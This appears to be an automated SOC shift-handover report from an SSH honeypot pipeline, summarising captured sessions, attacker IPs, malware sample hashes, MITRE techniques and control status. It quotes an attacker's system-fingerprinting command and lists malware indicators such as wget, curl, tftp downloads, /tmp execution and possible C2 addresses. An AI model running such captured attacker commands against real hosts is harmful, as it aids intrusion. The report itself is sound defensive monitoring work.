| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:52:24` | `cowrie.session.connect` |
| `2026-07-09 20:52:24` | `cowrie.client.version` |
| `2026-07-09 20:52:24` | `cowrie.client.kex` |
| `2026-07-09 20:52:24` | `cowrie.login.success` |
| `2026-07-09 20:52:26` | `cowrie.session.params` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.success` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.command.input` |
| `2026-07-09 20:52:26` | `cowrie.log.closed` |
| `2026-07-09 20:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15998c5a39d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]12` |
| **First Seen** | 2026-07-09 20:53 |
| **Last Seen** | 2026-07-09 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:53:47` | `cowrie.session.connect` |
| `2026-07-09 20:53:47` | `cowrie.client.version` |
| `2026-07-09 20:53:47` | `cowrie.client.kex` |
| `2026-07-09 20:53:48` | `cowrie.login.success` |
| `2026-07-09 20:53:48` | `cowrie.session.params` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.success` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:48` | `cowrie.command.input` |
| `2026-07-09 20:53:49` | `cowrie.log.closed` |
| `2026-07-09 20:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]12` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f75f52500c1

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 20:54 |
| **Last Seen** | 2026-07-09 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:54:10` | `cowrie.session.connect` |
| `2026-07-09 20:54:10` | `cowrie.client.version` |
| `2026-07-09 20:54:10` | `cowrie.client.kex` |
| `2026-07-09 20:54:11` | `cowrie.login.success` |
| `2026-07-09 20:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff17e42f54c7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-09 20:54 |
| **Last Seen** | 2026-07-09 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-09 20:54:10` | `cowrie.session.connect` |
| `2026-07-09 20:54:10` | `cowrie.client.version` |
| `2026-07-09 20:54:10` | `cowrie.client.kex` |
| `2026-07-09 20:54:11` | `cowrie.login.success` |
| `2026-07-09 20:54:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `72.47.208[.]90` | **96** | 2026-07-09 19:10 | 2026-07-09 20:55 | 48m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **43** | 2026-07-09 18:55 | 2026-07-09 20:53 | 44m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-09 19:07 | 2026-07-09 20:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **3** | 2026-07-09 19:51 | 2026-07-09 20:30 | 1m | 0 | `T1592` | 🟢 LOW |
| `206.81.2[.]201` | **3** | 2026-07-09 19:01 | 2026-07-09 20:26 | 1m | 0 | `T1592` | 🟢 LOW |
| `47.254.44[.]103` | **3** | 2026-07-09 19:00 | 2026-07-09 19:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | **2** | 2026-07-09 19:46 | 2026-07-09 20:46 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-09 20:04 | 2026-07-09 20:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.201.104[.]216` | 1 | 2026-07-09 20:38 | 2026-07-09 20:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `117.69.255[.]239` | 1 | 2026-07-09 20:45 | 2026-07-09 20:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-09 20:05 | 2026-07-09 20:05 | 14s | 0 | `T1592` | 🟢 LOW |
| `183.171.148[.]163` | 1 | 2026-07-09 20:43 | 2026-07-09 20:43 | 14s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]161` | 1 | 2026-07-09 19:45 | 2026-07-09 19:45 | 4s | 0 | `T1592` | 🟢 LOW |
| `213.66.197[.]199` | 1 | 2026-07-09 19:53 | 2026-07-09 19:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.21.241[.]50` | 1 | 2026-07-09 20:09 | 2026-07-09 20:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.23.95[.]14` | 1 | 2026-07-09 18:59 | 2026-07-09 18:59 | 37s | 0 | `T1592` | 🟢 LOW |
| `218.25.233[.]22` | 1 | 2026-07-09 19:23 | 2026-07-09 19:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `34.28.198[.]71` | 1 | 2026-07-09 19:38 | 2026-07-09 19:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.161[.]91` | 1 | 2026-07-09 19:17 | 2026-07-09 19:17 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.149[.]239` | 1 | 2026-07-09 20:48 | 2026-07-09 20:48 | 32s | 0 | `T1592` | 🟢 LOW |
| `67.220.180[.]114` | 1 | 2026-07-09 19:28 | 2026-07-09 19:29 | 39s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]123` | 1 | 2026-07-09 19:43 | 2026-07-09 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]248` | 1 | 2026-07-09 19:43 | 2026-07-09 19:43 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]252` | 1 | 2026-07-09 19:43 | 2026-07-09 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]254` | 1 | 2026-07-09 19:43 | 2026-07-09 19:43 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]55` | 1 | 2026-07-09 19:45 | 2026-07-09 19:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]41` | 1 | 2026-07-09 20:09 | 2026-07-09 20:09 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/73** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **32/73** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 61/100 | 🟡 MEDIUM | **29/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 86/100 | 🔴 HIGH | **39/73** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `91.230.168[.]55` | US | FR ONYPHE | **100** ⚠️ | 28 |
| `45.198.224[.]120` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 4 |
| `208.96.233[.]67` | CA | Cogeco Connexion inc | **100** ⚠️ | 50 |
| `65.20.134[.]97` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `124.88.174[.]143` | CN | China Unicom Xinjiang province network | **100** ⚠️ | 50 |
| `47.254.44[.]103` | US | Alibaba Cloud - US | **100** ⚠️ | 28 |
| `94.154.43[.]41` | TR | Storm Industries LLC | **100** ⚠️ | 10 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 30 |
| `211.228.97[.]97` | KR | Korea Telecom | **100** ⚠️ | 29 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 179 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 165 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 91 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 89 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 89 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 11 below threshold 25 | 2 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 362 cases |
| Tool 34  | Credential Extractor        | ✅ 204 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (6.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 44 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 164 priority case(s) shown individually · 27 recon entry/entries in table (8 group(s) consolidating 157 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-09T21:39:18Z_
